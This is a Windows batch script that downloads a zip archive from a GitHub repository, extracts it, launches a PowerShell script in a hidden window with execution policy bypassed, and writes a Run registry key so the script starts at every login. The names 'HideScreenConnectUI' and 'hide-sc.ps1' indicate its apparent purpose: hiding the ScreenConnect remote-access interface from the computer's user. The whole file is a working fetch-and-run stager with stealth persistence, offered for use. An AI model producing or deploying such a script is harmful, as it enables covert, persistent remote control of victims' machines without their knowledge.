@echo off
setlocal EnableExtensions

set "ZIP_URL=https://github.com/chanelwolthuis-del/hidezip/archive/refs/heads/main.zip"
set "INSTALL_DIR=%LOCALAPPDATA%\hide"
set "ZIP_FILE=%TEMP%\hide-github.zip"
set "INNER_ZIP=%TEMP%\hidezip-main\hide-sc.zip"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "REGKEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "VAL=HideScreenConnectUI"
set "SCRIPT=%INSTALL_DIR%\hide-sc.ps1"

echo [1/4] Downloading...
curl -L -o "%ZIP_FILE%" "%ZIP_URL%"
if errorlevel 1 goto :fail

echo [2/4] Extracting...
"%PS%" -NoProfile -Command "$b='%TEMP%\hidezip-main'; if(Test-Path $b){Remove-Item $b -Recurse -Force}; Expand-Archive -LiteralPath '%ZIP_FILE%' -DestinationPath '%TEMP%' -Force; if(Test-Path '%INSTALL_DIR%'){Remove-Item '%INSTALL_DIR%' -Recurse -Force}; New-Item -ItemType Directory -Path '%INSTALL_DIR%' -Force | Out-Null; Expand-Archive -LiteralPath '%INNER_ZIP%' -DestinationPath '%INSTALL_DIR%' -Force"
if errorlevel 1 goto :fail

if not exist "%SCRIPT%" goto :fail

echo [3/4] Starting hider...
start "" /B "%PS%" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT%"

echo [4/4] Installing at login...
reg add "%REGKEY%" /v "%VAL%" /t REG_SZ /d "\"%PS%\" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /f
if errorlevel 1 goto :fail

echo.
echo SUCCESS - Installed to %INSTALL_DIR%
echo Runs automatically at every login. No more clicks needed.
exit /b 0

:fail
echo FAILED - upload hide-sc.zip to GitHub and try again
exit /b 1
